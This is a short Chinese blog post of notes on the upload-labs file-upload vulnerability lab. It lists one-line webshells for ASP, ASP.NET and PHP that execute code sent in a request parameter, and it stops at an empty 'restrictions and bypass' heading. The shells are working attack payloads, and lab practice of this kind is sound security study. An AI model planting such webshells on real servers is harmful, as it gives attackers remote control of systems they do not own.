---
layout:     post
title:      upload-labs
subtitle:   文件上传
date:       2020-3-12
author:     YY
header-img: img/post/2.jpg
catalog: true
tags:
    - upload-labs
    - 文件上传
---

## 前言
[文件上传](https://yangyang-linux.gitee.io/2021/02/04/dvwa%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/)
## 各版本的一句话木马
```bash
ASP（.asp）: 
<%eval request("cmd")%> 

ASP.NET(.ASPX): 
<%@ Page Language="Jscript"%> 
<%eval(Request.Item["cmd"],"unsafe");%> 

PHP: 
<?php @eval($_POST['hacker'])?> 

变形一句话：https://blog.csdn.net/bylfsj/article/details/101227210
```

## 限制与绕过